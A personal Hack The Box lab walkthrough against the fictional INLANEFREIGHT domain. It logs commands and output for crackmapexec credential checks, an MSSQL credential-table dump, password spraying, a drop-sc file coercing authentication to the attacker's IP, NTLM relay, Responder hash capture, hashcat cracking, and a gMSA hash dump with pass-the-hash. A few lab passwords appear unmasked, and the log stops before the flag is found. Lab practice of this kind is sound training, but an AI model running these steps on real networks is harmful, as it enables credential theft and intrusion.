
1. Gain access to the DEV01 and submit the contents of the flag located in `C:\Users\Administrator\Desktop\flag.txt`.

```sh
# Ok. Can any of our current users log into DEV01?
sudo proxychains -q crackmapexec smb 172.16.15.20  -u XXXXXX -p 'XXXXXX' --local-auth

SMB         172.16.15.20    445    DEV01            [-] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX STATUS_LOGON_FAILURE 


# Same thing for local-auth. Juliette?
sudo proxychains -q crackmapexec smb 172.16.15.20  -u XXXXXX -p XXXXXX

SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 


# No local auth
sudo proxychains -q crackmapexec smb 172.16.15.20  -u XXXXXX -p XXXXXX --local-auth

SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:DEV01) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [-] DEV01\XXXXXX:XXXXXX STATUS_LOGON_FAILURE


# Atul? 
sudo proxychains -q crackmapexec smb 172.16.15.20  -u XXXXXX -p XXXXXX

SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 


# But no local auth
sudo proxychains -q crackmapexec smb 172.16.15.20  -u XXXXXX -p XXXXXX --local-auth
SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:DEV01) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [-] DEV01\XXXXXX:XXXXXX STATUS_LOGON_FAILURE 


# Ok. Let's check shares
sudo proxychains -q crackmapexec smb 172.16.15.20  -u XXXXXX -p XXXXXX --shares

Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


# XXXXXX
sudo proxychains -q crackmapexec smb 172.16.15.20  -u XXXXXX -p XXXXXX --shares

SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\Juliette:Password1 
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
DEV01            ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


# Ok. Who said devs, say hashes?  Can we steal some? But the note says they block LNK files. 
# So, can we drop? But then we need either a share where we can write or a user with permissions to write? Or can we drop credentials from MS01 that we can use somewhere else. 
# Or as the ntservice, can sqldev read the interns db?
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  -q "SELECT name FROM master.dbo.sysdatabases"
MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01            [+] SQL01\XXXXXX:XXXXXX (Pwn3d!)
MSSQL       172.16.15.15    1433   SQL01            name:master
MSSQL       172.16.15.15    1433   SQL01            name:tempdb
MSSQL       172.16.15.15    1433   SQL01            name:model
MSSQL       172.16.15.15    1433   SQL01            name:msdb
MSSQL       172.16.15.15    1433   SQL01            name:interns


# Can we read interns db?
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  -q "SELECT table_name from interns.INFORMATION_SCHEMA.TABLES" 

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01            [+] SQL01\XXXXXX:XXXXXX (Pwn3d!)
MSSQL       172.16.15.15    1433   SQL01            table_name:details


# YEEEEEEEEES!!!!! Finally. Can we dump?
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  -q "SELECT * from [interns].[dbo].details" 


# YEEEEEEEEEESSSSS!!!!!!
MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01            [+] SQL01\XXXXXX:XXXXXX (Pwn3d!)
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_id:XXXXXX
MSSQL       172.16.15.15    1433   SQL01            intern_pass:XXXXXX


# All interns have XXXXXX as password. My thinking, after internX login failed, there must be only one valid credential. That cred will have a write perm on the DEV_INTERN share found earlier. 
# AS in Interns -> write perms on Dev_interns - drop file to steal hashes -> Access to DEV01. Let's validate that theory. Let's find which intern credential is valid
cat userfound.txt 

XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX

# Passwords
cat passfound.txt 

XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX

# Attack
sudo proxychains -q crackmapexec smb 172.16.15.3 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
[+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
[+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
[-] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX STATUS_LOGON_FAILURE 
[-] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX STATUS_LOGON_FAILURE 
...
[+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
[-] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX STATUS_LOGON_FAILURE 
[-] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX STATUS_LOGON_FAILURE 
[-] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX STATUS_LOGON_FAILURE


# Validate that
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX --shares

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
[+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache                          Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV                             Development Share
DEV_INTERN      READ,WRITE      Development Share for Interns
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 


# Bingo. Knowing they don't accept LNK files, let's use drop_sc module. Get the module's options
crackmapexec smb -M drop-sc --options

[*] drop-sc module options:

        Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.
        https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/
        Module by @zblurx
        URL         URL in the searchConnector-ms file, default https://rickroll
        CLEANUP     Cleanup (choices: True or False)
        SHARE       Specify a share to target
        FILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it\'s automatically added), default is "Documents"


# Verify our relay list of targets gathered in question 1. Remove to only leave our target 172.16.15.20 since 172.16.15.15 was already dealt with
cat relaylistOutputFilename.txt 

172.16.15.20


# Start the relay using the file
sudo proxychains -q ntlmrelayx.py -tf relaylistOutputFilename.txt -smb2support --no-http

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server on port 445
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay enabled

[*] Servers started, waiting for connections


# Drop the file on the DC 172.16.15.3, pointing to our Kali IP, filename = gtpwn, on another terminal
sudo proxychains4 -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX -M drop-sc -o URL=\\\\10.10.14.3\\gtpwn SHARE=DEV_INTERN FILENAME=gtpwn

[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:WeXXXXXXlcome1 
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache                          Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV                             Development Share
DEV_INTERN      READ,WRITE      Development Share for Interns
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 

DROP-SC     172.16.15.3     445    DC01    [+] Found writable share: DEV_INTERN
DROP-SC     172.16.15.3     445    DC01    [+] [OPSEC] Created gtpwn.searchConnector-ms file on the DEV_INTERN share


# If everything worked as expected, we should see the connection in ntlm relay terminal
sudo proxychains -q ntlmrelayx.py -tf relaylistOutputFilename.txt -smb2support --no-http

...
[*] Servers started, waiting for connections
[*] Received connection from INLANEFREIGHT/XXXXXX at DC01, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-4 (process_request_thread): Connection from INLANEFREIGHT/XXXXXX@10.129.204.182 controlled, attacking target smb://172.16.15.20
[*] Authenticating against smb://172.16.15.20 as INLANEFREIGHT/JAMES SUCCEED
[*] All targets processed!
[*] SMBD-Thread-4 (process_request_thread): Connection from INLANEFREIGHT/XXXXXX@10.129.204.182 controlled, but there are no more targets left!
[*] Received connection from INLANEFREIGHT/XXXXXX at DC01, connection will be relayed after re-authentication
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Received connection from INLANEFREIGHT/XXXXXX at DC01, connection will be relayed after re-authentication
[*] All targets processed!
[*] SMBD-Thread-6 (process_request_thread): Connection from INLANEFREIGHT/XXXXXX@10.129.204.182 controlled, but there are no more targets left!
[*] Received connection from INLANEFREIGHT/XXXXXX at DC01, connection will be relayed after re-authentication
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from INLANEFREIGHT/XXXXXX@10.129.204.182 controlled, but there are no more targets left!
[*] Received connection from INLANEFREIGHT/XXXXXX at DC01, connection will be relayed after re-authentication
[*] All targets processed!


# No hashes after 5 min. Wonder if the 
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 


# has anything to do with it. Use the updated packet
sudo proxychains -q impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support --no-http

...
[*] SMBD-Thread-75 (process_request_thread): Connection from INLANEFREIGHT/XXXXXX@10.129.204.182 controlled, but there are no more targets left!
Traceback (most recent call last):
  File "/usr/local/lib/python3.11/dist-packages/impacket/smbserver.py", line 4483, in processRequest
    respCommands, respPackets, errorCode = self.__smb2Commands[smb2.SMB2_NEGOTIATE](
                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/dist-packages/impacket/examples/ntlmrelayx/servers/smbrelayserver.py", line 200, in SmbNegotiate
    raise Exception('Client does not support SMB2, fallbacking')
Exception: Client does not support SMB2, fallbacking
[*] Received connection from unknown at , connection will be relayed after re-authentication
[*] All targets processed!
...


# Per https://github.com/cube0x0/CVE-2021-1675/issues/9, might have to disable SMB2. So, remove it and try again
sudo proxychains -q ntlmrelayx.py -tf relaylistOutputFilename.txt --no-http


# The drop-sc
sudo proxychains4 -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX -M drop-sc -o URL=\\\\10.10.14.3\\gtpwn SHARE=DEV_INTERN FILENAME=gtpwn

...
DROP-SC     172.16.15.3     445    DC01     [+] Found writable share: DEV_INTERN
DROP-SC     172.16.15.3     445    DC01     [+] [OPSEC] Created gtpwn.searchConnector-ms file on the DEV_INTERN share



# Ok. Still doesn't work. Looks like we need to edit the config file for responder? Or just use responder itself with the drop-sc file
sudo responder -I tun0

...
[+] Current Session Variables:
    Responder Machine Name     [WIN-J0302VZF4D3]
    Responder Domain Name      [IB61.LOCAL]
    Responder DCE-RPC Port     [48470]

[+] Listening for events...

[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.129.204.182
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\XXXXXX
[SMB] NTLMv2-SSP Hash     : XXXXXX::INLANEFREIGHT:82c05d591f78ce40:747482631AA13C9A32FD3FC7DC90BC9F:010100000...0000000000
[*] Skipping previously captured hash for INLANEFREIGHT\james
...


# So, if not relay, then responder. Save the hash into a file
cat XXXXXX_hash

XXXXXX::INLANEFREIGHT:82c05d591f78ce40:747482631AA13C9A32FD3FC7DC90BC9F:010100000...0000000000

# Crack?
hashcat -a 0 -m 5600 XXXXXX_hash /usr/share/wordlists/rockyou.txt -O

...
XXXXXX::INLANEFREIGHT:82c05d591f78ce40:747482631AA13C9A32FD3FC7DC90BC9F:010100000...0000000000:XXXXXX
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: XXXXXX::INLANEFREIGHT:82c05d591f78ce40:747482631aa13...000000
Time.Started.....: Sat Feb 28 14:45:28 2026 (2 secs)
Time.Estimated...: Sat Feb 28 14:45:30 2026 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1413.2 kH/s (1.10ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2433191/14344385 (16.96%)
Rejected.........: 167/2433191 (0.01%)
Restore.Point....: 2431143/14344385 (16.95%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: 051402sc -> 045264624

Started: Sat Feb 28 14:45:10 2026
Stopped: Sat Feb 28 14:45:31 2026


# We have a password. Validate
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX


# Yes!!! What shares does he have access to?
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX --shares

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache                          Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV                             Development Share
DEV_INTERN      READ,WRITE      Development Share for Interns
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 


# Who is XXXXXX on DEV01?
sudo proxychains -q crackmapexec smb 172.16.15.20 -u XXXXXX -p XXXXXX --shares


# Same as XXXXXX
sudo proxychains -q crackmapexec smb 172.16.15.20 -u XXXXXX -p XXXXXX --local-auth

SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:DEV01) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [-] DEV01\XXXXXX:XXXXXX STATUS_LOGON_FAILURE 


# So, he is only a domain user. Ok. Is he member of an interesting group?
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb -u XXXXXX -p XXXXXX -M groupmembership -o USER=XXXXXX

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
[+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
[+] User: james is member of following groups: 
GROUPMEM... 172.16.15.3     389    DC01             Domain Users


# What next? Since I dropped as XXXXXX, what happens if I drop as XXXXXX? Any difference? Clean up
sudo proxychains4 -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX -M drop-sc -o URL=\\\\10.10.14.3\\gtpwn  FILENAME=gtpwn CLEANUP=True


[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
[+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
...
DROP-SC     172.16.15.3     445    DC01     [+] Found writable share: DEV_INTERN
DROP-SC     172.16.15.3     445    DC01     [+] Deleted gtpwn.searchConnector-ms file on the DEV_INTERN share


# Try dropping as XXXXXX anyways
sudo proxychains4 -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX -M drop-sc -o URL=\\\\10.10.14.3\\gtjames  FILENAME=gtjames 

...
DROP-SC     172.16.15.3     445    DC01             [+] Found writable share: DEV_INTERN
DROP-SC     172.16.15.3     445    DC01             [+] [OPSEC] Created gtjames.searchConnector-ms file on the DEV_INTERN share


# Relay
sudo proxychains -q impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support --no-http

...
[*] Servers started, waiting for connections
[*] Received connection from INLANEFREIGHT/XXXXXX at DC01, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-4 (process_request_thread): Connection from INLANEFREIGHT/XXXXXX@10.129.204.182 controlled, attacking target smb://172.16.15.20
[*] Authenticating against smb://172.16.15.20 as INLANEFREIGHT/JAMES SUCCEED
...

# So, it's something to do with James. What can I do with him? 
sudo proxychains -q crackmapexec smb 172.16.15.20 -u Administrator -p XXXXXX --local-auth

# Fail! Did we check the shares?
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL

...
SPIDER_PLUS 172.16.15.3     445    DC01             [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/172.16.15.3.json".
SPIDER_PLUS 172.16.15.3     445    DC01             [*] SMB Shares:           9 (ADMIN$, C$, Ccache, CertEnroll, DEV, DEV_INTERN, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 172.16.15.3     445    DC01             [*] SMB Readable Shares:  5 (CertEnroll, DEV_INTERN, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 172.16.15.3     445    DC01             [*] SMB Writable Shares:  1 (DEV_INTERN)
SPIDER_PLUS 172.16.15.3     445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 172.16.15.3     445    DC01             [*] Total folders found:  16
SPIDER_PLUS 172.16.15.3     445    DC01             [*] Total files found:    10
SPIDER_PLUS 172.16.15.3     445    DC01             [*] File size average:    1.13 KB
SPIDER_PLUS 172.16.15.3     445    DC01             [*] File size min:        22 B
SPIDER_PLUS 172.16.15.3     445    DC01             [*] File size max:        4.53 KB


# Nothing interesting on the machine
cat /tmp/nxc_hosted/nxc_spider_plus/172.16.15.3.json

...
    },
    "DEV_INTERN": {
        "gtjames.searchConnector-ms": {
            "atime_epoch": "2026-02-28 15:11:35",
            "ctime_epoch": "2026-02-28 15:11:35",
            "mtime_epoch": "2026-02-28 15:11:35",
            "size": "518 B"
        }
    },
...

# What is running on the machine?
sudo proxychains -q nmap -Pn -p- --open -A 172.16.15.20 -T 5

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 15:28 CST
...
Skipping host 172.16.15.20 due to host timeout
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 909.73 seconds


# Find responder
locate Responder.conf
/etc/responder/Responder.conf
/usr/share/responder/Responder.conf


# Turn SMB off in there. But then, spray James password to the users. Never know
sudo proxychains -q crackmapexec smb 172.16.15.20 -u final_users.txt -p XXXXXX


# Nothing besides XXXXXX. What is the password policy again?
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX --pass-pol

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
[+] INLANEFREIGHT.LOCAL\james:04apple 
[+] Dumping password info for domain: INLANEFREIGHT
Minimum password length: 1
Password history length: 24
Maximum password age: 41 days 23 hours 53 minutes 

Password Complexity Flags: 000000
    Domain Refuse Password Change: 0
    Domain Password Store Cleartext: 0
    Domain Password Lockout Admins: 0
    Domain Password No Clear Change: 0
    Domain Password No Anon Change: 0
    Domain Password Complex: 0

Minimum password age: 1 day 4 minutes 
Reset Account Lockout Counter: 30 minutes 
Locked Account Duration: 30 minutes 
Account Lockout Threshold: None
Forced Log off Time: Not Set


# Go back creating a list of real users
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX --users --log $(pwd)/real_users.txt


# Can either copy or save into the file
cut -d " " -f 1 real_users.txt > trimmed_users

wc -l trimmed_users
 
366 trimmed_users

# Create the list of passwords
cat wordpass

XXXXXX
XXXXXX
XXXXXX
XXXXXX
XXXXXX

# ok. Now use that to attack
sudo proxychains -q crackmapexec smb 172.16.15.3 -u trimmed_users -p wordpass --continue-on-success

...
[+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
...
[+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
...
[+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX
...
[+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
...

# Ok. Same creds I already had. Can I local auth?
sudo proxychains -q crackmapexec smb 172.16.15.20 -u trimmed_users -p wordpass --local-auth --continue-on-success


# Nope. Call bloodhound
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -q

# Escalate on MS01
 sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  -M mssql_priv -o ACTION=privesc


# Transfer to target
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  --put-file SharpHound.exe "C:\SharpHound.exe"

...
MSSQL       172.16.15.15    1433   SQL01            [*] Size is 1046528 bytes
MSSQL       172.16.15.15    1433   SQL01            [-] File does not exist on the remote system... error during upload


# SUCKER!!!! What am I supposed to do now? Can he read credentials? Enumerate Accounts with gMSA Privileges. Thank you forum
sudo proxychains -q crackmapexec winrm dc01.inlanefreight.htb -u XXXXXX -p XXXXXX  -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"

WINRM       172.16.15.3     5985   DC01             [-] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX


# Try reading anyways
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb -u XXXXXX -p XXXXXX --gmsa

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAPS       172.16.15.3     636    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
LDAPS       172.16.15.3     636    DC01             [*] Getting GMSA Passwords
LDAPS       172.16.15.3     636    DC01             Account: XXXXXX$          NTLM: XXXXXX


# F!YOU! HTB. How am I supposed to know that the guy has the perms? This is in the Admin module. F!YOU!!!! Use the hash to review Shared Folders with the XXXXXX$ Account
sudo proxychains -q crackmapexec smb dc01.inlanefreight.htb -u XXXXXX$ -H XXXXXX --shares

SMB         172.16.15.3     445    DC01             [*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache                          Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV                             Development Share
DEV_INTERN                      Development Share for Interns
IPC$            READ            Remote IPC
